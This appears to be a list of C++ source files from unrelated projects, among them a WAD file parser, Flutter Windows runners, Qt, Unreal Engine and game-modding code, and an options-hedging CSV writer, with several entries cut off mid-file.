    "#include \"utils.h\"\r\n\r\nint binary_search(const std::vector<std::string>& vec, std::string target) {\r\n    int left = 0;\r\n    int right = vec.size() - 1;\r\n\r\n    // Continue searching as long as the left boundary does not exceed the right boundary\r\n    while (left <= right) {\r\n        int mid = left + (right - left) / 2;\r\n\r\n        // Check if the middle element is the target\r\n        if (vec[mid] == target) {\r\n            return mid;  // Found the target, return its index\r\n        } else if (vec[mid] < target) {\r\n            left = mid + 1;  // Adjust the left boundary if the target is to the right\r\n        } else {\r\n            right = mid - 1;  // Adjust the right boundary if the target is to the left\r\n        }\r\n    }\r\n\r\n    return left;  // Target was not found in the vector, return where it would be inserted\r\n}\r\n\r\nvoid writeCSV(const std::vector<std::string>& dates,\r\n              const std::vector<double>& op_prices,\r\n              const std::vector<double>& values,\r\n              const std::vector<double>& IVs,\r\n              const std::vector<double>& deltas,\r\n              const std::vector<double>& HEs,\r\n              const std::vector<double>& PNLs,\r\n              const std::vector<double>& PNLs_Hedge,\r\n              const std::string& filename) {\r\n    \r\n    // Ensure all vectors are of the same size for consistent CSV writing\r\n    if (dates.size() != values.size() || dates.size() != IVs.size() || dates.size() != deltas.size() ||\r\n        dates.size() != HEs.size() || dates.size() != PNLs.size() || dates.size() != PNLs_Hedge.size()) {\r\n        std::cerr << \"Vectors have different sizes!\";\r\n        return;\r\n    }\r\n\r\n    // Open a file for writing\r\n    std::ofstream csvFile(filename);\r\n\r\n    if (!csvFile.is_open()) {\r\n        std::cerr << \"Failed to open the CSV file!\";\r\n        return;\r\n    }\r\n\r\n    // Write headers to the CSV file\r\n    csvFile << \"date,S,V,Implied volatility,delta,hedging error,PNL,PNL (with hedge)\" << \"\\n\";\r\n\r\n    // Loop through each element of the vectors and write them to the CSV file\r\n    for (size_t i = 0; i < dates.size(); ++i) {\r\n        csvFile << dates[i] << \",\" << op_prices[i] << \",\" << values[i] << \",\" << IVs[i] << \",\" << deltas[i] \r\n        << \",\" << HEs[i] << \",\" << PNLs[i] << \",\" << PNLs_Hedge[i] << \"\\n\";\r\n    }\r\n\r\n    csvFile.close();  // Close the file after writing\r\n}\r\n",
    "#include \"mainwindow.h\"\n#include \"sidebar.h\"\n#include \"loginwindow.h\"\n#include \"properties.h\"\n#include \"databaseconnectiondialog.h\"\n#include <QApplication>\n#include <QStyleFactory>\n\nQString basePath = \"/Users/anishan/Project/qt/student_manage_system/portraits\";\n\n\nQSqlDatabase connect(QSqlDatabase db) {\n    Properties properties(\"config.properties\");\n    if (!properties.exist()) {\n        DatabaseConnectionDialog dialog;\n        dialog.setModal(true);\n        if (dialog.exec() == QDialog::Rejected) {\n            exit(0);\n        }\n    }\n    properties.load();\n\n    db = QSqlDatabase::addDatabase(properties.get(\"driver\"));\n    db.setHostName(properties.get(\"url\"));\n    db.setDatabaseName(properties.get(\"table\"));\n    db.setUserName(properties.get(\"username\"));\n    db.setPassword(properties.get(\"password\"));\n    db.open();\n    return db;\n}\n\n\nQSqlDatabase initDatabase() {\n    DatabaseConnectionDialog dialog;\n    dialog.setModal(true);\n    QSqlDatabase db;\n    while(!db.isValid()) {\n        db = connect(db);\n        if (!db.isValid() && dialog.exec() == QDialog::Rejected) {\n            exit(0);\n        }\n\n    }\n    return db;\n}\n\nQString getStyleSheet() {\n    QFile file(\":/style/qss/main-style.qss\");\n    file.open(QIODevice::ReadOnly);\n    auto array = file.readAll();\n    file.close();\n    return QString::fromUtf8(array);\n}\n\nint main(int argc, char *argv[])\n{\n    QApplication app(argc, argv);\n\n//    basePath = QCoreApplication::applicationFilePath();\n//    qDebug() << basePath;\n    app.setStyleSheet(getStyleSheet());\n    QSqlDatabase db = initDatabase();\n\n    MainWindow w;\n//    w.show();\n    LoginWindow login(&w);\n    login.show();\n\n\n    return QApplication::exec();\n}\n\n",
    "#include \"Wad.h\"\n\nWad::Wad(const string &path) {\n    char buffer[4];\n\n    //open the binary file\n    int fd = open(path.c_str(), O_RDONLY);\n\n    //read the first 4 bytes into magic\n    read(fd, magic, 4);\n    magic[4] = '\\0';\n\n    //read the next 4 bytes into numDesc\n    read(fd, buffer, 4);\n    numDesc = *(int*)buffer;\n\n    //read the next 4 bytes into offset and move the fd to start at the offset\n    read(fd, buffer, 4);\n    offset = *(int*)buffer;\n    lseek(fd, offset, SEEK_SET);\n\n    root = new Node(0, 0, \"/\");\n\n    //pointer to the current directory/parent\n    Node* pwd = &(*root);\n    \n    int count = -1;\n    int fileOffset = 0;\n\n    //parse starting from offset\n    for (int i = 0; i < numDesc; i++) {\n        int nOffset;\n        int nLength;\n        char cnName[8];\n        \n        read(fd, &nOffset, 4);\n        read(fd, &nLength, 4);\n        read(fd, &cnName, 8);\n\n        fileOffset += 16;\n\n        string nName(cnName);\n\n        //determine what type of node it is\n        if (nLength == 0 && nName.find(\"START\") != string::npos) { //namespace beginning\n            nName = nName.substr(0, nName.find(\"_START\"));\n            Node* node = new Node(nOffset, nLength, nName);\n            node->parent = pwd;  \n            pwd->children.push_back(node);\n            pwd = node;\n\n        } else if (nName.at(0) == 'E' && nName.at(2) == 'M') { //map marker\n            count = 10;\n            Node* n = new Node(nOffset, nLength, nName);\n            pwd->children.push_back(n);\n            n->parent = pwd;\n            pwd = n;\n\n        } else if (nLength == 0 && nName.find(\"END\") != string::npos) { //namespace end\n            pwd = pwd->parent;\n\n        } else if (count <= 10 && count > 1) { //inside map marker\n            char* data = new char[nLength];\n            \n            lseek(fd, nOffset, SEEK_SET);\n            read(fd, data, nLength);\n\n            Node* node = new Node(nOffset, nLength, nName);\n            node->data = data;\n            node->parent = pwd;\n            pwd->children.push_back(node);\n\n            lseek(fd, offset + fileOffset, SEEK_SET);\n            count--;\n\n\n        } else if (count == 1) { //last element in map marker\n            char* data = new char[nLength];\n\n            lseek(fd, nOffset, SEEK_SET);\n            read(fd, data, nLength);\n\n            Node* node = new Node(nOffset, nLength, nName);\n            node->data = data;\n            node->parent = pwd;\n            pwd->children.push_back(node);\n\n            lseek(fd, offset + fileOffset, SEEK_SET);\n            pwd = pwd->parent;\n            count = -1;\n\n        } else { //files\n            char* data = new char[nLength];\n            \n            lseek(fd, nOffset, SEEK_SET);\n            read(fd, data, nLength);\n\n            Node* node = new Node(nOffset, nLength, nName);\n            node->data = data;\n            node->parent = pwd;\n            pwd->children.push_back(node);\n\n            lseek(fd, offset + fileOffset, SEEK_SET);\n        }\n    }\n\n    close(fd);\n}\n\nWad* Wad::loadWad(const string &path) {\n    Wad* wad = new Wad(path);\n    return wad;\n}\n\nstring Wad::getMagic() {\n    return (string)magic;\n}\n\nbool Wad::isContent(const string &path){\n    if (getNode(path) != nullptr && getNode(path)->children.empty()) {\n        return true;\n    }\n    return false;\n}\n\nbool Wad::isDirectory(const string &path) {\n    if (getNode(path) != nullptr && getNode(path)->length == 0) {\n        return true;\n    }\n    return false;\n}\n\nint Wad::getSize(const string &path) {\n    if (isContent(path)) {\n        return getNode(path)->length;\n    }\n    return -1;\n}\n\nint Wad::getContents(const string &path, char *buffer, int length, int offset) {\n    Node* node = getNode(path);\n    if (isContent(path)) {\n        if (node->length < offset + length) {\n            memcpy(buffer, node->data + offset, node->length - offset);\n            return node->length - offset;\n        }\n        memcpy(buffer, node->data + offset, length);\n        return length;\n    }\n    return -1;\n}\n\nint Wad::getDirectory(const string &path, vector<string> *directory) {\n    if (isDirectory(path)) {\n        Node* node = getNode(path);\n        for (int i = 0; i < node->children.size(); i++) {\n            directory->push_back(node->children[i]->name);\n        }\n        return directory->size();\n    }\n    return -1;\n}\n\nNode* Wad::getNode(const string &path) {\n    Node* curr = root;\n    vector<string> components;\n    int start = 1;\n    int end = path.find('/');\n\n    //separate path into components\n    if (path == \"/\") {\n        return curr;\n    } else {\n        while (end != string::npos) {\n            components.push_back(path.substr(start, end-start));\n            start = end + 1;\n            end = path.find('/', start);\n        }\n\n        if (start != path.length()) {\n            components.push_back(path.substr(start));\n        }\n\n    }\n\n    //search each directory to find the node for the given path\n    bool found = false;\n    for (string c : components) {\n        for (int i = 0; i < cur",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"AlpacaMovement.h\"\n#include \"GameFramework/Character.h\"\n#include \"Kismet/GameplayStatics.h\"\n#include \"DynamicMesh/DynamicMesh3.h\"\n#include \"DrawDebugHelpers.h\"\n#include \"Components/InputComponent.h\"\n\n// Sets default values\nAAlpacaMovement::AAlpacaMovement()\n{\n \t// Set this character to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\tPlayerCharacterptr = UGameplayStatics::GetPlayerCharacter(GetWorld(),0);\n}\n\n// Called when the game starts or when spawned\nvoid AAlpacaMovement::BeginPlay()\n{\n\tSuper::BeginPlay();\n}\n\n// Called every frame\nvoid AAlpacaMovement::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\t\n\tif(IsFollowing)\n\t{\n\t\tPlayerCharacterptr = UGameplayStatics::GetPlayerCharacter(GetWorld(),0);\n\t\tFollowCharacter(PlayerCharacterptr, DeltaTime);\n\t}\n\tDrawDebugOffset(PlayerCharacterptr);\n\t\n\t\n}\n\n// Called to bind functionality to input\nvoid AAlpacaMovement::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent)\n{\n\t\n\tSuper::SetupPlayerInputComponent(PlayerInputComponent);\n\t\n\tPlayerInputComponent->BindAction(TEXT(\"Stay\"), IE_Pressed,this, &AAlpacaMovement::Stay);\n\tPlayerInputComponent->BindAction(TEXT(\"Call\"),IE_Pressed, this, &AAlpacaMovement::Follow);\n}\n//Moves the Companion(Self) to a targetLocation and stops when it reaches the \nvoid AAlpacaMovement::MoveToLocation(FVector& TargetLocation,const float DeltaTime)\n{\n\tif(!TargetLocation.IsZero())\n\t{\n\t\tFVector CurrentLocation = GetActorLocation();\n\t\tFVector NewLocation = FMath::VInterpConstantTo(CurrentLocation,TargetLocation,DeltaTime,MovementSpeed);\n\t\tSetActorLocation((NewLocation));\n\t\t//May not be necesary because we already create a distance from the character to follow in the FollowCharacter method!!\n\t\t// if (FVector::DistSquared(CurrentLocation, TargetLocation) < FMath::Square(10.0f))\n\t\t// {\n\t\t// \tTargetLocation = FVector::ZeroVector;\n\t\t// }\n\t}\n}\n//Makes the Companion(self) follow a ACharacter.\nvoid AAlpacaMovement::FollowCharacter(const ACharacter* CharacterToFollow,const float DeltaTime)\n{\n\tif(CharacterToFollow)\n\t{\n\t\tFVector Offset = GetActorLocation() - PlayerCharacterptr->GetActorLocation();\n\t\tOffset.Normalize();\n\t\tFVector TargetLocation =PlayerCharacterptr->GetActorLocation() + Offset * FollowDistance;\n\t\t\n\t\tMoveToLocation(TargetLocation, DeltaTime);\n\t}\n}\n//Draws a sphere around the player that shows the limit(FollowDistance) for how close the companion can get to the player. \nvoid AAlpacaMovement::DrawDebugOffset(const ACharacter* Player)const\n{\n\tif(Player)\n\t{\n\t\tDrawDebugSphere(GetWorld(), Player->GetActorLocation(),FollowDistance, 12, FColor::Green,false, 0.1);\n\n\t}\n}\nvoid AAlpacaMovement::Stay()\n{\n\tIsFollowing = false;\n\tUE_LOG(LogTemp, Warning, TEXT(\"Stay!!\"));\n}\nvoid AAlpacaMovement::Follow()\n{\n\tIsFollowing = true;\n}\n\n\n\n\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"news\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pnpimagecity\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"UnionAfx.h\"\n\nnamespace Gothic_I_Addon {\n\n#ifdef __OAI_HUMAN_H__VER1__\n  zSTRING& oCAIHuman::Cam_Normal = *(zSTRING*)0x0091E828;\n  zSTRING& oCAIHuman::Cam_Run    = *(zSTRING*)0x0091E788;\n  zSTRING& oCAIHuman::Cam_Fight  = *(zSTRING*)0x0091E810;\n#endif // __OAI_HUMAN_H__VER1__\n\n#ifdef __OCOLLISION_OBJECT_MISC_CHAR_H__VER1__\n  zCCollisionObjectDef& oCCollObjectCharacter::s_oCollObjClass = *(zCCollisionObjectDef*)0x00A22CA8;\n#endif // __OCOLLISION_OBJECT_MISC_CHAR_H__VER1__\n\n#ifdef __ODOC_H__VER1__\n  zCView*& oCDoc::posView = *(zCView**)0x00920B20;\n#endif // __ODOC_H__VER1__\n\n#ifdef __OFOCUS_H__VER1__\n  oCNpcFocus*& oCNpcFocus::focus      = *(oCNpcFocus**)0x00920BC0;\n  oCNpcFocus** oCNpcFocus::focuslist  = (oCNpcFocus**)0x00920BA8;\n#endif // __OFOCUS_H__VER1__\n\n#ifdef __OINFO_H__VER1__\n  int& oCInfoManager::size_checked = *(int*)0x00921624;\n#endif // __OINFO_H__VER1__\n\n#ifdef __OINVENTORY_H__VER1__\n  zCList<oCItemContainer>& oCItemContainer::contList = *(zCList<oCItemContainer>*)0x00921820;\n  int& oCItemContainer::gfx_loaded                   = *(int*)0x009218D4;\n  zCGfx*& oCItemContainer::gfx_cat                   = *(zCGfx**)0x009218D8;\n  zCGfx*& oCItemContainer::gfx_equip                 = *(zCGfx**)0x009218DC;\n  zCGfx*& oCItemContainer::gfx_cursor                = *(zCGfx**)0x009218E0;\n  zCGfx*& oCItemContainer::gfx_cursor_equip          = *(zCGfx**)0x009218E4;\n  zCGfx** oCItemContainer::gfx_arrow                 = (zCGfx**)0x009218E8;\n  zCGfx** oCNpcInventory::gfx_cats                   = (zCGfx**)0x009218FC;\n#endif // __OINVENTORY_H__VER1__\n\n#ifdef __OITEM_REACT_H__VER1__\n  int& oCTradeManager::size_checked = *(int*)0x00921B3C;\n#endif // __OITEM_REACT_H__VER1__\n\n#ifdef __OMUSIC_ZONE_H__VER1__\n  long& oCZoneMusic::s_lastzonechange       = *(long*)0x0092675C;\n  int& oCZoneMusic::s_zonetime              = *(int*)0x008996D4;\n  int& oCZoneMusic::s_daytime               = *(int*)0x008996D8;\n  oHEROSTATUS& oCZoneMusic::s_herostatus    = *(oHEROSTATUS*)0x00926760;\n  oCZoneMusic*& oCZoneMusic::s_musiczone    = *(oCZoneMusic**)0x00926764;\n  oCZoneMusic*& oCZoneMusic::s_oldmusiczone = *(oCZoneMusic**)0x00926768;\n#endif // __OMUSIC_ZONE_H__VER1__\n\n#ifdef __ONEWS_H__VER1__\n  int& oCNews::news_counter = *(int*)0x0092258C;\n#endif // __ONEWS_H__VER1__\n\n#ifdef __ONPC_H__VER1__\n  zSTRING*& oCNpc::FightAIInstances        = *(zSTRING**)0x00A225B8;\n  oCNpc::oEBloodMode& oCNpc::modeBlood     = *(oCNpc::oEBloodMode*)0x0089E9E4;\n  int& oCNpc::isEnabledDamageDebug         = *(int*)0x00A22514;\n  oCStealContainer*& oCNpc::stealcontainer = *(oCStealContainer**)0x009232F8;\n  int& oCNpc::s_bEnabledDialogCamStop      = *(int*)0x00923138;\n  zMAT4& oCNpc::s_playerPositionMatrix     = *(zMAT4*)0x00923178;\n  oCNpc*& oCNpc::player                    = *(oCNpc**)0x00923134;\n  int& oCNpc::godmode                      = *(int*)0x0092311C;\n  int& oCNpc::angle_near                   = *(int*)0x00893F90;\n  int& oCNpc::angle_far_up                 = *(int*)0x00893F94;\n  int& oCNpc::angle_far_side               = *(int*)0x00893F98;\n  int& oCNpc::game_mode                    = *(int*)0x009232EC;\n  oCNpc*& oCNpc::dontArchiveThisNpc        = *(oCNpc**)0x0092313C;\n  int*& oCNpc::bodyStateList               = *(int**)0x00922A48;\n  int& oCNpc::ai_disabled                  = *(int*)0x00923120;\n  float& oCNpc::ai_messagesSkip            = *(float*)0x00923124;\n  float& oCNpc::ai_messagesSkipTimer       = *(float*)0x00923128;\n  float& oCNpc::ai_scriptStateSkip         = *(float*)0x0092312C;\n  float& oCNpc::ai_scriptStateSkipTimer    = *(float*)0x00923130;\n  int& oCNpc::ai_baseEnabled               = *(int*)0x00893F84;\n  int& oCNpc::isEnabledTalkBox             = *(int*)0x00893F88;\n#endif // __ONPC_H__VER1__\n\n#ifdef __OTEXT_H__VER1__\n  zCView*& oCText::output           = *(zCView**)0x0092414C;\n  int& oCText::TXT_GUILD            = *(int*)0x00924150;\n  int& oCText::TXT_ATTRIBUTE        = *(int*)0x00924154;\n  int& oCText::TXT_FIGHT_TALENT     = *(int*)0x00924158;\n  int& oCText::TXT_TALENT           = *(int*)0x0092415C;\n  int& oCText::TXT_DAYTIME          = *(int*)0x00924160;\n  int*& oCText::TXT_ATR             = *(int**)0x00924134;\n  int& oCText::TXT_ATR_HP           = *(int*)0x00924164;\n  int& oCText::TXT_SPELL            = *(int*)0x0092416C;\n  int& oCText::TXT_ATTITUDE         = *(int*)0x00924168;\n  int& oCText::TXT_PC_GREETING      = *(int*)0x00924170;\n  int& oCText::TXT_PC_FIRST_PHRASE  = *(int*)0x00924174;\n  int& oCText::TXT_PC_SECOND_PHRASE = *(int*)0x00924178;\n  int& oCText::TXT_PC_TRADE_PHRASE  = *(int*)0x0092417C;\n  int& oCText::TXT_NPC_LAST_PHRASE  = *(int*)0x00924180;\n  int& oCText::TXT_PC_TRADE_THREAT  = *(int*)0x00924184;\n  int& oCText::TXT_NPC_TRADE_THREAT = *(int*)0x00924188;\n  int& oCText::TXT_PC_INFO_THREAT   = *(int*)0x0092418C;\n  int& oCText::TXT_NPC_INFO_THREAT  = *(int*)0x00924190;\n  int& oCText::TXT_NEWS_INTRO       = *(int*)0x00924198;\n  int& oCText::TXT_NEWS_STOLE       = *(int*)0x0092419C;\n  int& oCText::TXT_NEWS_STOLE_10    =",
    "// MatrixGame - SR2 Planetary battles engine\n// Copyright (C) 2012, Elemental Games, Katauri Interactive, CHK-Games\n// Licensed under GPLv2 or any later version\n// Refer to the LICENSE file included\n\n#include \"stdafx.h\"\n#include \"MatrixMap.hpp\"\n\nstruct STempPoints\n{\n    dword invisible;    // 0 - visible // 1 - invisible\n    dword invisibleNow;    // 0 - visible // 1 - invisible\n    D3DXVECTOR3 p;\n\n};\nstruct STempCalcs\n{\n    SPlane plane1;\n    SPlane plane2;\n    D3DXVECTOR3 p[4];\n};\n\nstruct SPotEdge\n{\n    D3DXVECTOR3 p1,p2;\n    SPlane plane1;\n    SPlane plane2;\n};\n\nstruct SVisGroup\n{\n    int x, y; //group coord\n    dword id;\n\n    LPDWORD invisible[(MAP_GROUP_SIZE + 1) * (MAP_GROUP_SIZE + 1)];\n    int invisibleCount;\n\n    D3DXVECTOR3 sourcePoints[(MAP_GROUP_SIZE + 1) * 4];\n    int         sourcePointsCount;\n\n    float minz;\n\n    D3DXVECTOR2 myPosition;\n\n    void BuildPoints(STempPoints *points)\n    {\n        minz = 0;\n        id = x + y * 65536;\n        invisibleCount = 0;\n        CMatrixMapGroup *group = g_MatrixMap->GetGroupByIndex(x,y);\n        int xp = (x*MAP_GROUP_SIZE);\n        int yp = (y*MAP_GROUP_SIZE);\n        \n        myPosition = D3DXVECTOR2(float(xp * GLOBAL_SCALE), float(yp * GLOBAL_SCALE));\n\n\n        if (group != nullptr)\n        {\n            minz = 100000;\n            // build dest pts\n\n            int width = min(MAP_GROUP_SIZE, (g_MatrixMap->m_Size.x - xp));\n            int heigth = min(MAP_GROUP_SIZE, (g_MatrixMap->m_Size.y - yp));\n\n            ASSERT(width != 0 && heigth != 0);\n\n            for (int yy = 0; yy <= heigth; ++yy)\n            {\n                for (int xx = 0; 